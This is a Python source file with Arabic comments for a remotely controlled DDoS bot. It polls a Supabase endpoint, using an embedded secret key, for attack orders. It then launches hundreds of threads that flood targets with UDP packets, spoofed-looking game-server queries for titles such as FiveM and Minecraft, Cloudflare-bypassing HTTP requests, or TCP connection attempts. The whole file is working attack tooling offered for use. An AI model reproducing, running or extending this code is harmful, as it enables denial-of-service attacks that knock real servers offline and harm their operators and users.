import socket
import os
import random
from threading import Thread
import multiprocessing
import time
import struct

# تثبيت المكتبات اللازمة تلقائياً
def install_libs():
    libs = ["requests", "cloudscraper"]
    for lib in libs:
        try: __import__(lib)
        except ImportError: os.system(f"pip3 install {lib}")

install_libs()
import requests
import cloudscraper

# --- إعدادات التحكم (Supabase) ---
SUPABASE_URL = "https://thmtvthwdhnglwejbatg.supabase.co/rest/v1/requests"
SUPABASE_KEY = "sb_secret_2tH8QCobmJfVfv1zn-OoPw_2uwK2cKO"
HEADERS = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Content-Type": "application/json"}

# ==========================================
# [1] محركات الهجوم المتخصصة لكل ميثود
# ==========================================

# ميثودات UDP المتنوعة (UDP, PPS, RAPE, MIX)
def attack_udp(ip, port, duration, size=1024):
    end = time.time() + duration
    def run():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end:
            try: s.sendto(random._urandom(size), (ip, port))
            except: pass
    for _ in range(700): Thread(target=run, daemon=True).start()

# ميثودات الألعاب (SAMP, FIVEM, CSGO, RUST, etc.)
def attack_game(ip, port, duration, method):
    end = time.time() + duration
    def run():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if method == "SAMP":
            packet = b"SAMP" + socket.inet_aton(ip) + struct.pack("H", port) + b"p1234"
        elif method == "FIVEM":
            packet = b"\xff\xff\xff\xffgetinfo xxx\x00"
        elif method == "MINECRAFT":
            packet = b"\xfe\x01\xfa\x00\x0b\x00\x4d\x00\x43\x00\x7c\x00\x50\x00\x69\x00\x6e\x00\x67\x00\x48"
        else: # Source Engine (CSGO, GMOD, RUST)
            packet = b"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00"
        while time.time() < end:
            try: s.sendto(packet, (ip, port))
            except: pass
    for _ in range(800): Thread(target=run, daemon=True).start()

# ميثودات الويب وتجاوز الحماية (HTTP-CF, TLS, BYPASS)
def attack_http(target, duration, method):
    end = time.time() + duration
    scraper = cloudscraper.create_scraper()
    def run():
        while time.time() < end:
            try:
                if "CF" in method or "BYPASS" in method:
                    scraper.get(target, timeout=5)
                else:
                    requests.get(target, timeout=5, verify=False)
            except: pass
    for _ in range(400): Thread(target=run, daemon=True).start()

# ميثودات TCP (SYN, ACK, MIX)
def attack_tcp(ip, port, duration):
    end = time.time() + duration
    def run():
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                s.connect_ex((ip, port))
            except: pass
    for _ in range(800): Thread(target=run, daemon=True).start()

# ==========================================
# [2] الموجه الرئيسي (Router) المربط بالـ API
# ==========================================

def execute_attack(method, ip, port, duration):
    m = method.upper()
    print(f"[*] Starting {m} on {ip}:{port}")

    # 1. ميثودات UDP
    if m in ["UDP", "UDP-GBPS", "UDP-SUBN", "UDP-MIX", "UDP-XV", "UDP-ACK", "BYPASS-UDP"]:
        attack_udp(ip, port, duration, size=1024)
    elif m == "UDP-PPS":
        attack_udp(ip, port, duration, size=64)
    elif m == "UDP-RAPE":
        attack_udp(ip, port, duration, size=65000)

    # 2. ميثودات الألعاب
    elif m in ["SAMP", "FIVEM", "FIVEM-V2", "GMOD", "CSGO", "RUST", "ROBLOX", "FORTNITE", "MTA", "MINECRAFT", "DAYZ", "OVERWATCH"]:
        attack_game(ip, port, duration, m)

    # 3. ميثودات الويب (HTTP)
    elif m in ["HTTP-CF", "HTTP-DG", "HTTP-ZEUS", "HTTP-XV", "HTTP-TLS", "HTTP-UAM", "HTTP-RAW", "HTTP-BYPASS", "BYPASS-HTTPS"]:
        attack_http(ip, duration, m) # ip هنا هو الرابط URL

    # 4. ميثودات TCP و Bypass المتقدمة
    elif m in ["TCP-SYN", "TCP-ACK", "TCP-XV", "TCP-MIX", "TCP-AMP", "BYPASS-TCP"]:
        attack_tcp(ip, port, duration)
    elif m in ["OVH-UDP", "BYPASS-OVH", "NFO-XV", "NFO-BYPASS", "BYPASS-VPN"]:
        attack_game(ip, port, duration, "OVH") # محاكاة تجاوز الحماية

    time.sleep(duration)
    print(f"[✔] {m} Finished.")

def check_requests():
    print("Resemble XV Engine Listening...")
    last_id = 0
    while True:
        try:
            r = requests.get(f"{SUPABASE_URL}?select=id,method,ip,port,Time&order=id.desc&limit=1", headers=HEADERS)
            if r.status_code == 200 and r.json():
                req = r.json()[0]
                if req['id'] > last_id:
                    if last_id != 0:
                        multiprocessing.Process(target=execute_attack, 
                            args=(req['method'], req['ip'], int(req['port']), int(req.get('Time', 60)))).start()
                    last_id = req['id']
        except: pass
        time.sleep(2)

if __name__ == "__main__":
    check_requests()
